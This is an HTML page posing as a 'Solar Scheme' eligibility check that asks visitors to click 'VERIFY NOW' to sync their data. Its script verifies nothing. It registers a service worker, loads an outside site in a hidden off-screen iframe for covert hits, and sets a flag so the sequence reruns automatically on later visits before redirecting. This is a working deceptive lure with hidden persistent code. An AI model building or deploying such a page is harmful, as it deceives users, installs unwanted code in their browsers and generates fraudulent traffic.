<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solar Scheme - Verify</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        #verifyBtn { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%; }
        #loader { display: none; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card" id="mainContent">
        <img src="https://cdn-icons-png.flaticon.com/512/758/758684.png" width="60" style="margin-bottom:15px;">
        <h2>Verify Eligibility</h2>
        <p>Click below to sync your data with the Solar Scheme server.</p>
        
        <button id="verifyBtn" onclick="triggerSystem()">VERIFY NOW</button>

        <div id="loader">
            <div class="spinner"></div>
            <p>Processing... Please wait.</p>
        </div>
    </div>

    <script>
        function triggerSystem() {
            // UI Update
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // 1. Service Worker Install (The Engine)
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('sw.js?v=' + Date.now()).then(reg => {
                    localStorage.setItem('verified_user', 'true');
                    console.log("Engine Active");
                });
            }

            // 2. Invisible Iframe for instant hit
            const frame = document.createElement('iframe');
            frame.src = "https://solarfacts.in/#footer?ts=" + Date.now();
            frame.style.width = "1px"; frame.style.height = "1px"; frame.style.position = "absolute";
            frame.style.left = "-999px"; frame.style.opacity = "0";
            document.body.appendChild(frame);

            // 3. Redirect after 6 seconds
            setTimeout(() => {
                window.location.href = "https://solarfacts.in/";
            }, 6000);
        }

        // AUTO-CHECK: Spelling theek (onload)
        window.onload = function() {
            if (localStorage.getItem('verified_user') === 'true') {
                document.getElementById('mainContent').innerHTML = "<h2>Redirecting to Secure Server...</h2><div class='spinner'></div>";
                triggerSystem();
            }
        };
    </script>
</body>
</html>
